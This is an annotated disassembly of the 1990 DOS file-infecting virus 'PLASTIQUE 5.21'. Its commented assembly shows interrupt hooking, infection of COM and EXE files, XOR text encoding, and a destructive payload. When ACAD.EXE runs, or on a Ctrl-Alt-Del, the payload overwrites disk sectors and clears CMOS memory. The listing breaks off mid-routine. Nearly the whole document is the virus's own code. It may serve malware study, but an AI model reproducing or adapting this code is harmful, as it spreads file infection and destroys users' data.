;---------------------------------------------------------------------------
;     PLASTIQE v:5.21 Virus code
;
;                                      Disassembled by SI-IS, 1990.10.21.
;---------------------------------------------------------------------------

      Org 100


0100  E9800B         JMP    0C83
0103                 DW     ?               ;Wait counter ??

0106                 DW     0,0             ;Orig INT 09 handler addres
010A                 DW     0,0             ;Orig INT 13 handler addres

011C                 DW     0               ;File handle
011E                 DW     0               ;File attribute
012C                 DB     1Ch DUP(0)      ;Buffer for Exe Header


014C                 DW                     ;Ofs of file name to execute
014E                 DB     ?

014F                 DB     ?

0158                 DW     0,0             ;New size of EXE file


015D                 DB     ?
015E                 DB     'ACAD.EXE'
0166                 DB     'COMMAND.COM'
0171                 DB     '.COM'
0175                 DB     '.EXE'

018B                 DB     'PLASTIQUE 5.21 (plastic bomb)',0D,0A
                            'Copyright (C) 1988-1990 by ABT Group '
                             '(in association with Hammer LAB.)',0D,0A
                            'WARNING: DON'T RUN ACAD.EXE!$'

020F                 DB     0               ;?
0210                 DW     0               ;?

0218                 DB     ? ? ?           ;Music Data

0321                 DW     0,0             ;Orig INT 08 handler addres

;---------------------------------------------------------------------------
03E9  32C0           XOR    AL,AL           ;(* Critical error handler *)
03EB  CF             IRET
;---------------------------------------------------------------------------
03EC  2E803E4F0001   CMP    CS:[004F],01    ;(* INT 08 HANDLER - TIMER *)
03F2  7431           JZ     0425
03F4  50             PUSH   AX
03F5  2EA14A00       MOV    AX,CS:[004A]
03F9  2E39060300     CMP    CS:[0003],AX
03FE  58             POP    AX
03FF  7711           JA     0412
0401  2EA05D00       MOV    AL,CS:[005D]
0405  0455           ADD    AL,55
0407  2EA25D00       MOV    CS:[005D],AL
040B  7205           JC     0412
040D  2EFF060300     INC    W/CS:[0003]
0412  51             PUSH   CX
0413  2E8B0E0300     MOV    CX,CS:[0003]
0418  90             NOP
0419  E2FD           LOOP   0418
041B  59             POP    CX
041C  2EFF2E2103     JMP    Far CS:[0321]   ;Jump to orig INT 08 handler
0421  A5             MOVSW
0422  FE00           INC    B/[BX+SI]
0424  F0             LOCK

0425  2EFF060300     INC    W/CS:[0003]     ;(* MUSIC *)
042A  2E813E03000080 CMP    CS:[0003],8000
0431  7702           JA     0435
0433  EBE7           JMP    041C            ;Jump to orig INT 08 handler

0435  1E             PUSH   DS
0436  50             PUSH   AX
0437  53             PUSH   BX
0438  0E             PUSH   CS
0439  1F             POP    DS
043A  8B1E1001       MOV    BX,[0110]
043E  FE0E0F01       DEC    B/[010F]
0442  7567           JNZ    04AB
0444  E461           IN     AL,[61]         ;Speaker OFF
0446  24FE           AND    AL,FE
0448  E661           OUT    [61],AL
044A  8B1E1001       MOV    BX,[0110]
044E  FF061001       INC    W/[0110]
0452  81FB8300       CMP    BX,0083
0456  7503           JNZ    045B
0458  EB36           JMP    0490
045A  90             NOP
045B  8A871802       MOV    AL,[BX+0218]
045F  A20F01         MOV    [010F],AL
0462  D1E3           SHL    BX,1
0464  8B871201       MOV    AX,[BX+0112]
0468  3D0000         CMP    AX,0000
046B  7403           JZ     0470
046D  EB0A           JMP    0479
046F  90             NOP
0470  E461           IN     AL,[61]
0472  24FE           AND    AL,FE
0474  E661           OUT    [61],AL
0476  EB33           JMP    04AB
0478  90             NOP
0479  8BD8           MOV    BX,AX
047B  B0B6           MOV    AL,B6
047D  E643           OUT    [43],AL         ;Set Timer Chip
047F  8BC3           MOV    AX,BX
0481  E642           OUT    [42],AL
0483  8AC4           MOV    AL,AH
0485  E642           OUT    [42],AL
0487  E461           IN     AL,[61]         ;Speaker ON
0489  0C03           OR     AL,03
048B  E661           OUT    [61],AL
048D  EB1C           JMP    04AB
048F  90             NOP
0490  E461           IN     AL,[61]
0492  24FE           AND    AL,FE
0494  E661           OUT    [61],AL
0496  C70610010000   MOV    [0110],0000
049C  C6060F0101     MOV    [010F],01
04A1  B80080         MOV    AX,8000
04A4  22260500       AND    AH,[0005]
04A8  A30300         MOV    [0003],AX
04AB  5B             POP    BX
04AC  58             POP    AX
04AD  1F             POP    DS
04AE  E96BFF         JMP    041C
;---------------------------------------------------------------------------
04B1  FA             CLI                    ;(* INT 09 HANDLER - KEYBOARD *)
04B2  50             PUSH   AX
04B3  1E             PUSH   DS
04B4  33C0           XOR    AX,AX
04B6  8ED8           MOV    DS,AX
04B8  A01704         MOV    AL,[0417]
04BB  1F             POP    DS
04BC  240C           AND    AL,0C
04BE  3C0C           CMP    AL,0C
04C0  752E           JNZ    04F0
04C2  E460           IN     AL,[60]
04C4  247F           AND    AL,7F
04C6  3C53           CMP    AL,53
04C8  7526           JNZ    04F0
04CA  2E813E03000080 CMP    CS:[0003],8000
04D1  721D           JC     04F0
04D3  2E803E4F0001   CMP    CS:[004F],01
04D9  7403           JZ     04DE
04DB  EB13           JMP    04F0
04DD  90             NOP
04DE  E461           IN     AL,[61]
04E0  0C80           OR     AL,80
04E2  E661           OUT    [61],AL
04E4  247F           AND    AL,7F
04E6  E661           OUT    [61],AL
04E8  58             POP    AX
04E9  B020           MOV    AL,20
04EB  E620           OUT    [20],AL
04ED  EB0A           JMP    04F9
04EF  90             NOP
04F0  58             POP    AX
04F1  9C             PUSHF
04F2  2EFF1E0600     CALL   Far CS:[0006]
04F7  FB             STI
04F8  CF             IRET

;---------------------------------------------------------------------------
04F9  0E             PUSH   CS
04FA  58             POP    AX
04FB  8ED8           MOV    DS,AX
04FD  8EC0           MOV    ES,AX
04FF  B002           MOV    AL,02
0501  E621           OUT    [21],AL
0503  FB             STI
0504  E461           IN     AL,[61]
0506  24FE           AND    AL,FE
0508  E661           OUT    [61],AL
050A  C70610010000   MOV    [0110],0000
0510  C6060F0101     MOV    [010F],01
0515  C70603004C7F   MOV    [0003],7F4C
051B  B80400         MOV    AX,0004         ;Set video mode to Groph 320x200
051E  CD10           INT    10              ;
0520  B8070E         MOV    AX,0E07         ;Write teletype - Bell
0523  CD10           INT    10
0525  BEA202         MOV    SI,02A2
0528  E87300         CALL   059E
052B  E87000         CALL   059E
052E  E83A00         CALL   056B
0531  E83700         CALL   056B
0534  C606BA0201     MOV    [02BA],01
0539  BEA202         MOV    SI,02A2
053C  E87E00         CALL   05BD
053F  E87B00         CALL   05BD
0542  E87800         CALL   05BD
0545  E87500         CALL   05BD
0548  803EBA0201     CMP    [02BA],01
054D  7402           JZ     0551
054F  EBE3           JMP    0534
0551  E460           IN     AL,[60]
0553  8AE0           MOV    AH,AL
0555  E470           IN     AL,[70]
0557  3AC4           CMP    AL,AH
0559  740D           JZ     0568
055B  B94000         MOV    CX,0040
055E  8AC1           MOV    AL,CL
0560  E670           OUT    [70],AL
0562  B0FF           MOV    AL,FF
0564  E671           OUT    [71],AL
0566  E2F6           LOOP   055E
0568  F4             HLT
0569  EBFD           JMP    0568

056B  C60400         MOV    [SI],00
056E  B80102         MOV    AX,0201
0571  B90100         MOV    CX,0001
0574  B600           MOV    DH,00
0576  8A5404         MOV    DL,[SI+04]
0579  BB0010         MOV    BX,1000
057C  E87B00         CALL   05FA
057F  7219           JC     059A
0581  C60401         MOV    [SI],01
0584  BF1800         MOV    DI,0018
0587  8B8D0010       MOV    CX,[DI+1000]
058B  884C01         MOV    [SI+01],CL
058E  BF1A00         MOV    DI,001A
0591  8B8D0010       MOV    CX,[DI+1000]
0595  FEC9           DEC    CL
0597  884C05         MOV    [SI+05],CL
059A  83C606         ADD    SI,0006
059D  C3             RET

059E  C60400         MOV    [SI],00
05A1  B408           MOV    AH,08
05A3  8A5404         MOV    DL,[SI+04]
05A6  E87600         CALL   061F
05A9  720E           JC     05B9
05AB  887405         MOV    [SI+05],DH
05AE  80E13F         AND    CL,3F
05B1  FEC9           DEC    CL
05B3  884C01         MOV    [SI+01],CL
05B6  C60401         MOV    [SI],01
05B9  83C606         ADD    SI,0006
05BC  C3             RET

05BD  BB8B00         MOV    BX,008B
05C0  803C01         CMP    [SI],01
05C3  752E           JNZ    05F3
05C5  C606BA0200     MOV    [02BA],00
05CA  8B4C02         MOV    CX,[SI+02]
05CD  B600           MOV    DH,00
05CF  8A5404         MOV    DL,[SI+04]
05D2  8A4401         MOV    AL,[SI+01]
05D5  B403           MOV    AH,03
05D7  E82000         CALL   05FA
05DA  7214           JC     05F0
05DC  FEC6           INC    DH
05DE  3A7405         CMP    DH,[SI+05]
05E1  76EF           JNA    05D2
05E3  80440301       ADD    [SI+03],01
05E7  730A           JNC    05F3
05E9  80440240       ADD    [SI+02],40
05ED  EB04           JMP    05F3
05EF  90             NOP
05F0  C60400         MOV    [SI],00
05F3  83C606         ADD    SI,0006
05F6  C3             RET

05F7                 DB     00,09
05F9                 DB     03

05FA  C606F70400     MOV    [04F7],00
05FF  A3F804         MOV    [04F8],AX
0602  E81A00         CALL   061F
0605  80E4C3         AND    AH,C3
0608  7414           JZ     061E
060A  B400           MOV    AH,00
060C  E81000         CALL   061F
060F  A1F804         MOV    AX,[04F8]
0612  FE06F704       INC    B/[04F7]
0616  803EF70401     CMP    [04F7],01
061B  76E5           JNA    0602
061D  F9             STC
061E  C3             RET

061F  9C             PUSHF
0620  2EFF1E0A00     CALL   Far CS:[000A]
0625  C3             RET

;---------------------------------------------------------------------------
                                            ;(* INT 13 HANDLER - DISK IO *)
0626  80FC02         CMP    AH,02           ;Read sector ?
0629  751B           JNZ    0646            ; No
062B  F6C280         TEST   DL,80           ;Hard disk <C>
062E  751A           JNZ    064A            ; No
0630  80FA02         CMP    DL,02           ;Floppy <B>
0633  7711           JA     0646
0635  83F902         CMP    CX,0002
0638  750C           JNZ    0646
063A  80FE00         CMP    DH,00
063D  7507           JNZ    0646
063F  EB13           JMP    0654
0641  90             NOP

0642                 DB     01,00
0644                 DB     80,01
0646  E92001         JMP    0769
0649                 DB     00

064A  80FE01         CMP    DH,01
064D  75F7           JNZ    0646
064F  80FD00         CMP    CH,00
0652  75F2           JNZ    0646
0654  2E803E490502   CMP    CS:[0549],02
065A  7407           JZ     0663
065C  2EFE064905     INC    B/CS:[0549]
0661  EBE3           JMP    0646
0663  2EC606490500   MOV    CS:[0549],00
0669  2E803E5C0001   CMP    CS:[005C],01
066F  74D5           JZ     0646
0671  50             PUSH   AX
0672  53             PUSH   BX
0673  51             PUSH   CX
0674  52             PUSH   DX
0675  56             PUSH   SI
0676  57             PUSH   DI
0677  06             PUSH   ES
0678  1E             PUSH   DS
0679  8CC8           MOV    AX,CS
067B  8ED8           MOV    DS,AX
067D  8EC0           MOV    ES,AX
067F  8816DF02       MOV    [02DF],DL
0683  B400           MOV    AH,00
0685  E897FF         CALL   061F
0688  BB0010         MOV    BX,1000
068B  B80102         MOV    AX,0201
068E  B90100         MOV    CX,0001
0691  B600           MOV    DH,00
0693  E889FF         CALL   061F
0696  7243           JC     06DB
0698  F6C280         TEST   DL,80
069B  7405           JZ     06A2
069D  E8CE00         CALL   076E
06A0  7239           JC     06DB
06A2  B8CB3C         MOV    AX,3CCB
06A5  39473E         CMP    [BX+3E],AX
06A8  7518           JNZ    06C2
06AA  8B4740         MOV    AX,[BX+40]
06AD  3DFEFF         CMP    AX,FFFE
06B0  7429           JZ     06DB
06B2  2B4742         SUB    AX,[BX+42]
06B5  3D0400         CMP    AX,0004
06B8  7508           JNZ    06C2
06BA  E8E300         CALL   07A0
06BD  7303           JNC    06C2
06BF  E99F00         JMP    0761
06C2  F606DF0280     TEST   [02DF],80
06C7  7415           JZ     06DE
06C9  C606E10207     MOV    [02E1],07
06CE  C606E20200     MOV    [02E2],00
06D3  C606E00200     MOV    [02E0],00
06D8  EB3F           JMP    0719
06DA  90             NOP
06DB  E98300         JMP    0761
06DE  C606E10201     MOV    [02E1],01
06E3  C606E20228     MOV    [02E2],28
06E8  8A4715         MOV    AL,[BX+15]
06EB  3CFC           CMP    AL,FC
06ED  7305           JNC    06F4
06EF  C606E20250     MOV    [02E2],50
06F4  A0E202         MOV    AL,[02E2]
06F7  BBBB02         MOV    BX,02BB
06FA  B90900         MOV    CX,0009
06FD  8807           MOV    [BX],AL
06FF  83C304         ADD    BX,0004
0702  E2F9           LOOP   06FD
0704  B80905         MOV    AX,0509
0707  BBBB02         MOV    BX,02BB
070A  C606E00200     MOV    [02E0],00
070F  C606E10201     MOV    [02E1],01
0714  E8AD00         CALL   07C4
0717  7248           JC     0761
0719  BB0000         MOV    BX,0000
071C  A1E102         MOV    AX,[02E1]
071F  A3440E         MOV    [0E44],AX
0722  A1DF02         MOV    AX,[02DF]
0725  A3460E         MOV    [0E46],AX
0728  B80903         MOV    AX,0309
072B  E89600         CALL   07C4
072E  7231           JC     0761
0730  C606E10201     MOV    [02E1],01
0735  C606E20200     MOV    [02E2],00
073A  F6C280         TEST   DL,80
073D  740C           JZ     074B
073F  A14205         MOV    AX,[0542]
0742  A3E102         MOV    [02E1],AX
0745  A14405         MOV    AX,[0544]
0748  A3DF02         MOV    [02DF],AX
074B  BE0310         MOV    SI,1003
074E  BF030E         MOV    DI,0E03
0751  B92300         MOV    CX,0023
0754  90             NOP
0755  FC             CLD
0756  F3A4           REP    MOVSB
0758  BB000E         MOV    BX,0E00
075B  B80103         MOV    AX,0301
075E  E86300         CALL   07C4
0761  1F             POP    DS
0762  07             POP    ES
0763  5F             POP    DI
0764  5E             POP    SI
0765  5A             POP    DX
0766  59             POP    CX
0767  5B             POP    BX
0768  58             POP    AX
0769  2EFF2E0A00     JMP    Far CS:[000A]

076E  BEBE11         MOV    SI,11BE
0771  B304           MOV    BL,04
0773  803C80         CMP    [SI],80
0776  740E           JZ     0786
0778  803C00         CMP    [SI],00
077B  7507           JNZ    0784
077D  83C610         ADD    SI,0010
0780  FECB           DEC    BL
0782  75EF           JNZ    0773
0784  F9             STC
0785  C3             RET
0786  8B04           MOV    AX,[SI]
0788  A34405         MOV    [0544],AX
078B  8B4402         MOV    AX,[SI+02]
078E  A34205         MOV    [0542],AX
0791  8B14           MOV    DX,[SI]
0793  8B4C02         MOV    CX,[SI+02]
0796  B80102         MOV    AX,0201
0799  BB0010         MOV    BX,1000
079C  E85BFE         CALL   05FA
079F  C3             RET
07A0  8B4740         MOV    AX,[BX+40]
07A3  33D2           XOR    DX,DX
07A5  F77718         DIV    W/[BX+18]
07A8  FEC2           INC    DL
07AA  8816E102       MOV    [02E1],DL
07AE  33D2           XOR    DX,DX
07B0  F7771A         DIV    W/[BX+1A]
07B3  8816E002       MOV    [02E0],DL
07B7  A2E202         MOV    [02E2],AL
07BA  B80102         MOV    AX,0201
07BD  BB0010         MOV    BX,1000
07C0  E80100         CALL   07C4
07C3  C3             RET
07C4  8B0EE102       MOV    CX,[02E1]
07C8  8B16DF02       MOV    DX,[02DF]
07CC  E82BFE         CALL   05FA
07CF  C3             RET
07D0    60
07D1    1478
07D3    02


;---------------------------------------------------------------------------
07D4  9C             PUSHF                  ;(* INT 21 HANDLER - DOS FUNC *)
07D5  3D404B         CMP    AX,4B40         ;AL = 40 - Invalid call
07D8  7505           JNZ    07DF
07DA  B87856         MOV    AX,5678         ;Detect Plastiqe ?
07DD  9D             POPF
07DE  CF             IRET

07DF  3D414B         CMP    AX,4B41         ;AL = 41 - Invalid call
07E2  741E           JZ     0802

07E4  3D004B         CMP    AX,4B00         ;AX = 4B00 - Load And Run Program
07E7  7503           JNZ    07EC
07E9  EB34           JMP    081F
07EB  90             NOP

07EC  3D003D         CMP    AX,3D00         ;AX = 3D00 - Open File to Read
07EF  750B           JNZ    07FC
07F1  2E803E4E0001   CMP    CS:[004E],01
07F7  7403           JZ     07FC
07F9  EB24           JMP    081F
07FB  90             NOP
07FC  9D             POPF
07FD  2EFF2ED006     JMP    Far CS:[06D0]   ;Jump to orig Dos handler

0802  58             POP    AX
0803  58             POP    AX
0804  B80001         MOV    AX,0100
0807  2EA31400       MOV    CS:[0014],AX
080B  58             POP    AX
080C  2EA31600       MOV    CS:[0016],AX
0810  F3A4           REP    MOVSB
0812  9D             POPF
0813  E88003         CALL   0B96            ;Zero register
0816  8B0E2400       MOV    CX,[0024]
081A  2EFF2E1400     JMP    Far CS:[0014]

081F  2EC7061C00FFFF MOV    CS:[001C],FFFF  ;
0826  2EC70648000000 MOV    CS:[0048],0000
082D  2E89161800     MOV    CS:[0018],DX    ;Name of file to execute
0832  2E8C1E1A00     MOV    CS:[001A],DS
0837  50             PUSH   AX
0838  53             PUSH   BX
0839  51             PUSH   CX
083A  52             PUSH   DX
083B  56             PUSH   SI
083C  57             PUSH   DI
083D  1E             PUSH   DS
083E  06             PUSH   ES
083F  FC             CLD
0840  8BF2           MOV    SI,DX
0842  8A04           MOV    AL,[SI]         ;Convert file name to UpperCase
0844  0AC0           OR     AL,AL
0846  740E           JZ     0856
0848  3C61           CMP    AL,61           ;'a'
084A  7207           JC     0853
084C  3C7A           CMP    AL,7A           ;'z'
084E  7703           JA     0853
0850  802C20         SUB    [SI],20
0853  46             INC    SI
0854  EBEC           JMP    0842

0856  2E89364C00     MOV    CS:[004C],SI    ;SI = ptr to End of ASCIIZ fname
085B  8BC6           MOV    AX,SI
085D  0E             PUSH   CS
085E  07             POP    ES
085F  B90B00         MOV    CX,000B         ;Length of string
0862  2BF1           SUB    SI,CX
0864  BF6600         MOV    DI,0066         ;Ptr to 'COMMAND.COM' string
0867  F3A6           REP    CMPSB           ;File name = 'COMMAND.COM' ?
0869  7503           JNZ    086E            ; No
086B  E9F702         JMP    0B65            ; Yes - Exit from handler

086E  8BF0           MOV    SI,AX
0870  B90800         MOV    CX,0008         ;Length of string
0873  2BF1           SUB    SI,CX
0875  BF5E00         MOV    DI,005E         ;Ptr to 'ACAD.EXE' string
0878  F3A6           REP    CMPSB           ;File name = 'ACAD.EXE' ?
087A  751C           JNZ    0898            ; No
087C  0E             PUSH   CS              ; Yes
087D  1F             POP    DS
087E  0E             PUSH   CS
087F  07             POP    ES
0880  B409           MOV    AH,09           ;Print String
0882  BA8B00         MOV    DX,008B         ; Virus (c) & WARNING
0885  CD21           INT    21
0887  C6064F0001     MOV    [004F],01
088C  C70603000080   MOV    [0003],8000
0892  BEAE02         MOV    SI,02AE
0895  E996FC         JMP    052E            ;jmp to music rutin (halt proc)

0898  B80043         MOV    AX,4300         ;Get file attribute
089B  CD21           INT    21
089D  7205           JC     08A4
089F  2E890E1E00     MOV    CS:[001E],CX    ;Save it
08A4  7271           JC     0917
08A6  32C0           XOR    AL,AL
08A8  2EA22B00       MOV    CS:[002B],AL
08AC  2E8B364C00     MOV    SI,CS:[004C]
08B1  B90400         MOV    CX,0004         ;Length of string
08B4  2BF1           SUB    SI,CX
08B6  BF7100         MOV    DI,0071         ;Ptr to '.COM' string
08B9  F3A6           REP    CMPSB           ;File extension = '.COM' ?
08BB  741C           JZ     08D9            ; Yes
08BD  2EFE062B00     INC    B/CS:[002B]
08C2  2E8B364C00     MOV    SI,CS:[004C]
08C7  B90400         MOV    CX,0004         ;Length of string
08CA  2BF1           SUB    SI,CX
08CC  BF7500         MOV    DI,0075         ;Ptr to '.EXE' string
08CF  F3A6           REP    CMPSB           ;File extension = '.EXE' ?
08D1  7406           JZ     08D9            ; Yes
08D3  83C1FF         ADD    CX,FFFF         ; No
08D6  EB3F           JMP    0917
08D8  90             NOP
08D9  8BFA           MOV    DI,DX
08DB  32D2           XOR    DL,DL
08DD  807D013A       CMP    [DI+01],3A
08E1  7505           JNZ    08E8
08E3  8A15           MOV    DL,[DI]
08E5  80E21F         AND    DL,1F
08E8  B436           MOV    AH,36           ;Get disk free space
08EA  CD21           INT    21
08EC  3DFFFF         CMP    AX,FFFF         ; = Set carry flag
08EF  7503           JNZ    08F4
08F1  E97102         JMP    0B65
08F4  F7E3           MUL    BX
08F6  F7E1           MUL    CX
08F8  0BD2           OR     DX,DX
08FA  7505           JNZ    0901
08FC  3D0010         CMP    AX,1000         ;Available Space > 4096 ?
08FF  72F0           JC     08F1
0901  2E8B161800     MOV    DX,CS:[0018]
0906  B8003D         MOV    AX,3D00         ;Open file to read
0909  2EC6064E0001   MOV    CS:[004E],01
090F  CD21           INT    21
0911  2EC6064E0000   MOV    CS:[004E],00
0917  7267           JC     0980
0919  2EA31C00       MOV    CS:[001C],AX
091D  8BD8           MOV    BX,AX           ;BX = File handle
091F  B80242         MOV    AX,4202         ;Set file pos to EOF
0922  B9FFFF         MOV    CX,FFFF
0925  BAFBFF         MOV    DX,FFFB
0928  CD21           INT    21
092A  7254           JC     0980
092C  050500         ADD    AX,0005
092F  2EA32400       MOV    CS:[0024],AX
0933  B80042         MOV    AX,4200         ;Set file pos 0
0936  B90000         MOV    CX,0000
0939  BA1200         MOV    DX,0012
093C  CD21           INT    21
093E  7240           JC     0980
0940  B90200         MOV    CX,0002         ;Read 2 byte
0943  BA4600         MOV    DX,0046
0946  8BFA           MOV    DI,DX
0948  8CC8           MOV    AX,CS
094A  8ED8           MOV    DS,AX
094C  8EC0           MOV    ES,AX
094E  B43F           MOV    AH,3F
0950  CD21           INT    21
0952  8B05           MOV    AX,[DI]
0954  3D8919         CMP    AX,1989
0957  7507           JNZ    0960
0959  B43E           MOV    AH,3E           ;Close file
095B  CD21           INT    21
095D  E90502         JMP    0B65
0960  B82435         MOV    AX,3524         ;Get INT 24 vector
0963  CD21           INT    21              ;    (Critical error handler)
0965  891EE502       MOV    [02E5],BX       ;Store it
0969  8C06E702       MOV    [02E7],ES
096D  BAE902         MOV    DX,02E9
0970  B82425         MOV    AX,2524
0973  CD21           INT    21
0975  C5161800       LDS    DX,[0018]
0979  33C9           XOR    CX,CX
097B  B80143         MOV    AX,4301         ;Set file attribute
097E  CD21           INT    21
0980  723B           JC     09BD
0982  2E8B1E1C00     MOV    BX,CS:[001C]
0987  B43E           MOV    AH,3E           ;Close file
0989  CD21           INT    21
098B  2EC7061C00FFFF MOV    CS:[001C],FFFF
0992  B8023D         MOV    AX,3D02         ;Open file to Write
0995  CD21           INT    21
0997  7224           JC     09BD
0999  2EA31C00       MOV    CS:[001C],AX    ;Store handle
099D  8CC8           MOV    AX,CS
099F  8ED8           MOV    DS,AX
09A1  8EC0           MOV    ES,AX
09A3  8B1E1C00       MOV    BX,[001C]
09A7  B80057         MOV    AX,5700         ;Get file date
09AA  CD21           INT    21
09AC  89162000       MOV    [0020],DX       ;Store it
09B0  890E2200       MOV    [0022],CX
09B4  B80042         MOV    AX,4200         ;Set file pos to 0
09B7  33C9           XOR    CX,CX
09B9  8BD1           MOV    DX,CX
09BB  CD21           INT    21
09BD  725F           JC     0A1E
09BF  803E2B0000     CMP    [002B],00       ;File type ? 0 if .COM
09C4  7403           JZ     09C9
09C6  EB72           JMP    0A3A
09C8  90             NOP
                                            ;INFECT COM FILE ---------------
09C9  BB0010         MOV    BX,1000         ;Allocate 1000h paragraphs
09CC  B448           MOV    AH,48
09CE  CD21           INT    21
09D0  730B           JNC    09DD            ;Ok, mem allocated
09D2  B43E           MOV    AH,3E           ;Error, Close file
09D4  8B1E1C00       MOV    BX,[001C]
09D8  CD21           INT    21
09DA  E98801         JMP    0B65            ;Exit from handler
09DD  FF064800       INC    W/[0048]
09E1  8EC0           MOV    ES,AX           ;Segment of allocated memory
09E3  33F6           XOR    SI,SI
09E5  8BFE           MOV    DI,SI
09E7  A10300         MOV    AX,[0003]
09EA  0C01           OR     AL,01
09EC  813E03000080   CMP    [0003],8000
09F2  7202           JC     09F6
09F4  B000           MOV    AL,00
09F6  A20500         MOV    [0005],AL
09F9  C6065C0001     MOV    [005C],01
09FE  E87201         CALL   0B73            ;DeCode  text
0A01  B90010         MOV    CX,1000
0A04  F3A4           REP    MOVSB           ;Move virus to begin of block
0A06  E86A01         CALL   0B73            ;Code text
0A09  C6065C0000     MOV    [005C],00
0A0E  8BD7           MOV    DX,DI           ;Addr of buffer
0A10  8B0E2400       MOV    CX,[0024]       ;Nr Of Bytes to read
0A14  8B1E1C00       MOV    BX,[001C]       ;Handle
0A18  06             PUSH   ES
0A19  1F             POP    DS
0A1A  B43F           MOV    AH,3F           ;Read from file
0A1C  CD21           INT    21
0A1E  7215           JC     0A35
0A20  03F9           ADD    DI,CX           ;DI = New file size
0A22  7211           JC     0A35
0A24  33C9           XOR    CX,CX
0A26  8BD1           MOV    DX,CX
0A28  B80042         MOV    AX,4200         ;Set file pos to 0
0A2B  CD21           INT    21
0A2D  8BCF           MOV    CX,DI           ;Write To File Virus + Orig code
0A2F  33D2           XOR    DX,DX
0A31  B440           MOV    AH,40
0A33  CD21           INT    21
0A35  720D           JC     0A44
0A37  E9E600         JMP    0B20

                                            ;INFECT EXE FILES
0A3A  B91C00         MOV    CX,001C         ;Read 1C byte from begin of file
0A3D  BA2C00         MOV    DX,002C
0A40  B43F           MOV    AH,3F
0A42  CD21           INT    21
0A44  7252           JC     0A98
0A46  813E3E008919   CMP    [003E],1989     ;If INFECTED
0A4C  744A           JZ     0A98            ;>> Here equal - Exit handler
0A4E  C7063E008919   MOV    [003E],1989
0A54  A13A00         MOV    AX,[003A]       ;SS
0A57  A35600         MOV    [0056],AX
0A5A  A13C00         MOV    AX,[003C]       ;SP
0A5D  A35000         MOV    [0050],AX
0A60  A14000         MOV    AX,[0040]       ;IP
0A63  A35200         MOV    [0052],AX
0A66  A14200         MOV    AX,[0042]       ;CS
0A69  A35400         MOV    [0054],AX
0A6C  A13000         MOV    AX,[0030]
0A6F  833E2E0000     CMP    [002E],0000
0A74  7401           JZ     0A77
0A76  48             DEC    AX
0A77  F7267B00       MUL    W/[007B]
0A7B  03062E00       ADD    AX,[002E]
0A7F  83D200         ADC    DX,0000
0A82  050F00         ADD    AX,000F
0A85  83D200         ADC    DX,0000
0A88  25F0FF         AND    AX,FFF0
0A8B  A35800         MOV    [0058],AX
0A8E  89165A00       MOV    [005A],DX
0A92  050010         ADD    AX,1000
0A95  83D200         ADC    DX,0000
0A98  723A           JC     0AD4
0A9A  F7367B00       DIV    W/[007B]
0A9E  0BD2           OR     DX,DX
0AA0  7401           JZ     0AA3
0AA2  40             INC    AX
0AA3  A33000         MOV    [0030],AX
0AA6  89162E00       MOV    [002E],DX
0AAA  A15800         MOV    AX,[0058]
0AAD  8B165A00       MOV    DX,[005A]
0AB1  F7367900       DIV    W/[0079]
0AB5  2B063400       SUB    AX,[0034]
0AB9  A34200         MOV    [0042],AX       ;NEW CS
0ABC  C7064000B80B   MOV    [0040],0BB8     ;NEW IP
0AC2  A33A00         MOV    [003A],AX       ;NEW SS
0AC5  C7063C00FE0D   MOV    [003C],0DFE     ;NEW SP
0ACB  33C9           XOR    CX,CX
0ACD  8BD1           MOV    DX,CX
0ACF  B80042         MOV    AX,4200         ;Set file pos to 0
0AD2  CD21           INT    21
0AD4  720A           JC     0AE0
0AD6  B91C00         MOV    CX,001C         ;Write NEW Exe header
0AD9  BA2C00         MOV    DX,002C
0ADC  B440           MOV    AH,40
0ADE  CD21           INT    21
0AE0  7211           JC     0AF3
0AE2  3BC1           CMP    AX,CX           ;Write succesfull ?
0AE4  753A           JNZ    0B20
0AE6  8B165800       MOV    DX,[0058]       ;Set file pos to End of Orig file
0AEA  8B0E5A00       MOV    CX,[005A]       ; + 0..15 (paragraph alignment)
0AEE  B80042         MOV    AX,4200
0AF1  CD21           INT    21
0AF3  722B           JC     0B20
0AF5  A10300         MOV    AX,[0003]
0AF8  0C01           OR     AL,01
0AFA  813E03000080   CMP    [0003],8000
0B00  7202           JC     0B04
0B02  B000           MOV    AL,00
0B04  A20500         MOV    [0005],AL
0B07  C6065C0001     MOV    [005C],01
0B0C  E86400         CALL   0B73
0B0F  33D2           XOR    DX,DX
0B11  B90010         MOV    CX,1000         ;Write virus to file
0B14  B440           MOV    AH,40
0B16  CD21           INT    21
0B18  E85800         CALL   0B73
0B1B  C6065C0000     MOV    [005C],00
0B20  2E833E480000   CMP    CS:[0048],0000
0B26  7404           JZ     0B2C
0B28  B449           MOV    AH,49           ;Free allocated memory block
0B2A  CD21           INT    21
0B2C  2E833E1C00FF   CMP    CS:[001C],FFFF
0B32  7431           JZ     0B65
0B34  2E8B1E1C00     MOV    BX,CS:[001C]
0B39  2E8B162000     MOV    DX,CS:[0020]
0B3E  2E8B0E2200     MOV    CX,CS:[0022]
0B43  B80157         MOV    AX,5701         ;Set file time
0B46  CD21           INT    21
0B48  B43E           MOV    AH,3E           ;Close file
0B4A  CD21           INT    21
0B4C  2EC5161800     LDS    DX,CS:[0018]
0B51  2E8B0E1E00     MOV    CX,CS:[001E]
0B56  B80143         MOV    AX,4301         ;Set file attribute
0B59  CD21           INT    21
0B5B  2EC516E502     LDS    DX,CS:[02E5]
0B60  B82425         MOV    AX,2524         ;Set INT 24 to orig (Crit Err)
0B63  CD21           INT    21
0B65  07             POP    ES
0B66  1F             POP    DS
0B67  5F             POP    DI
0B68  5E             POP    SI
0B69  5A             POP    DX
0B6A  59             POP    CX
0B6B  5B             POP    BX
0B6C  58             POP    AX
0B6D  9D             POPF
0B6E  2EFF2ED006     JMP    Far CS:[06D0]

;---------------------------------------------------------------------------
0B73  1E             PUSH   DS              ;Decode Text
0B74  06             PUSH   ES
0B75  57             PUSH   DI
0B76  56             PUSH   SI
0B77  51             PUSH   CX
0B78  50             PUSH   AX
0B79  0E             PUSH   CS
0B7A  07             POP    ES
0B7B  0E             PUSH   CS
0B7C  1F             POP    DS
0B7D  BE5E00         MOV    SI,005E
0B80  8BFE           MOV    DI,SI
0B82  B9B100         MOV    CX,00B1
0B85  8A260500       MOV    AH,[0005]
0B89  AC             LODSB
0B8A  32C4           XOR    AL,AH
0B8C  AA             STOSB
0B8D  E2FA           LOOP   0B89
0B8F  58             POP    AX
0B90  59             POP    CX
0B91  5E             POP    SI
0B92  5F             POP    DI
0B93  07             POP    ES
0B94  1F             POP    DS
0B95  C3             RET
;---------------------------------------------------------------------------
0B96  33C0           XOR    AX,AX           ;Zero Registers
0B98  8BD8           MOV    BX,AX
